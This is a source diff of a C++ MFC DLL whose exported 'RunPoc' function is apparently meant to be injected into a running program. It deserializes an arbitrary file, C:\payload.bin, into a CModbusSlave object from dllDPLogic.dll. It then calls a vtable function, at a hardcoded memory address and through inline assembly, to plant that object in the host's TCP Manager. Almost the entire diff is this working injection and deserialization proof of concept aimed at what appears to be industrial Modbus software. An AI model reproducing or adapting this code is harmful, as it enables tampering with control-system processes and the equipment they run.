@@ -2,12 +2,10 @@
 #include <afxwin.h>
 #include <vector>
 
-// 目标类工厂函数签名
 typedef CRuntimeClass* (__stdcall* PGET_CLASS)();
 
-// 辅助函数：显示错误，确保不乱码
 void ShowError(LPCTSTR msg) {
-    ::MessageBox(NULL, msg, _T("Injector Debug"), MB_OK | MB_ICONERROR);
+    ::MessageBox(NULL, msg, _T("Injector"), MB_OK | MB_ICONERROR);
 }
 
 extern "C" __declspec(dllexport) void RunPoc()
@@ -16,103 +14,72 @@ extern "C" __declspec(dllexport) void RunPoc()
 
     const TCHAR* kPayloadPath = _T("C:\\payload.bin");
     CFile file;
-
-    // 1. 打开文件
     if (!file.Open(kPayloadPath, CFile::modeRead | CFile::typeBinary)) {
         ShowError(_T("Failed to open C:\\payload.bin"));
         return;
     }
 
     ULONGLONG size = file.GetLength();
-    if (size == 0) {
-        ShowError(_T("Payload is empty"));
-        file.Close();
-        return;
-    }
-
-    // 2. 读取数据
     std::vector<BYTE> buffer((size_t)size);
     file.Read(buffer.data(), (UINT)size);
     file.Close();
 
-    // 3. 构建反序列化环境
     CMemFile memFile(buffer.data(), (UINT)size);
     CArchive ar(&memFile, CArchive::load);
 
-    // 4. 获取模块和工厂
     HMODULE module = ::GetModuleHandle(_T("dllDPLogic.dll"));
     if (!module) {
-        ShowError(_T("dllDPLogic.dll not loaded in this process"));
+        ShowError(_T("dllDPLogic.dll not loaded"));
         return;
     }
 
-    // 注意：GetProcAddress 的参数永远是 ANSI，不需要 _T()
     FARPROC proc = ::GetProcAddress(module, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
-    if (!proc) {
-        ShowError(_T("CModbusSlave factory not found! Check symbol name."));
-        return;
-    }
+    if (!proc) { ShowError(_T("Factory not found")); return; }
 
-    // 5. 创建对象
     PGET_CLASS getClass = reinterpret_cast<PGET_CLASS>(proc);
-    CRuntimeClass* runtimeClass = getClass ? getClass() : nullptr;
-    if (!runtimeClass) {
-        ShowError(_T("Runtime class pointer is null"));
-        return;
-    }
-
+    CRuntimeClass* runtimeClass = getClass();
     CObject* obj = runtimeClass->CreateObject();
-    if (!obj) {
-        ShowError(_T("Failed to CreateObject()"));
-        return;
-    }
 
-    // 6. 执行反序列化 (这是关键一步)
+    if (!obj) { ShowError(_T("CreateObject failed")); return; }
+
+    // 1. 反序列化
     try {
         obj->Serialize(ar);
-
-        // 如果能走到这里，说明成功了！
-        ::MessageBox(NULL, _T("🎉 Success: Object Hydrated!"), _T("Injector"), MB_OK);
-
-        // === 核心挂载逻辑 ===
-        void* pManager = *(void**)0x0084713C; // TCP Manager 地址
-        if (!pManager) {
-            ShowError(_T("TCP Manager Not Initialized! Open a project first."));
-        } else {
-            void** vtable = *(void***)pManager;
-            void* pAddFunc = vtable[34];
-            CObject* pSlave = obj;
-            int result = 0;
-
-            __asm {
-                push 1
-                push pSlave
-                mov ecx, pManager
-                call pAddFunc
-                mov result, eax
-            }
-
-            ::MessageBox(NULL, _T("🎉 Attached! Check the Tree View!"), _T("Success"), MB_OK);
-            obj = nullptr;
-        }
-    }
-    catch (CException* e) {
-        TCHAR szCause[1024] = { 0 };
-        e->GetErrorMessage(szCause, 1024);
-
-        CString msg;
-        msg.Format(_T("Serialize Failed:\n%s"), szCause);
-        ShowError(msg);
-
+    } catch (CException* e) {
         e->Delete();
+        ShowError(_T("Serialize Failed"));
+        delete obj; // 只有失败才删
+        return;
+    }
+
+    // 2. 挂载到 TCP Manager
+    void* pManager = *(void**)0x0084713C;
+
+    if (!pManager) {
+        ShowError(_T("Manager is NULL"));
+        delete obj;
+        return;
+    }
+
+    try {
+        DWORD* vtable = *(DWORD**)pManager;
+        void* pAddFunc = (void*)vtable[34];
+
+        int result = 0;
+        __asm {
+            push 1
+            push obj
+            mov ecx, pManager
+            call pAddFunc
+            mov result, eax
+        }
+
+        ::MessageBox(NULL, _T("Inject Success! Check Tree View!"), _T("Done"), MB_OK);
     }
     catch (...) {
-        ShowError(_T("Crash during Attachment!"));
+        ShowError(_T("Crash during Attach"));
     }
 
-    if (obj) {
-        delete obj;
-    }
     ar.Close();
     memFile.Close();
 }
